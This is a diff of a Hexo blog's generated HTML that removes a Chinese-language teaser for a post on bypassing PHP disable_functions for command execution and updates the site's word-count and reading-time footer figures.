-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>命令执行一般都用php自带的函数来进行执行,但是很多时候运维或者搞安全的会禁用这些用不到的函数来加固,包括一些CTF也是禁用一些函数来考察你的绕过能力,这时候就需要你对常见的函数绕过进行一些了解,本文就是总结下php在所有自带命令执行函数被禁后的其他操作.</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/posts/php%E7%BB%95%E8%BF%87disable%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1193,12 +1253,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">135k</span>
+    <span title="站点总字数">150k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:03</span>
+    <span title="站点阅读时长">2:17</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
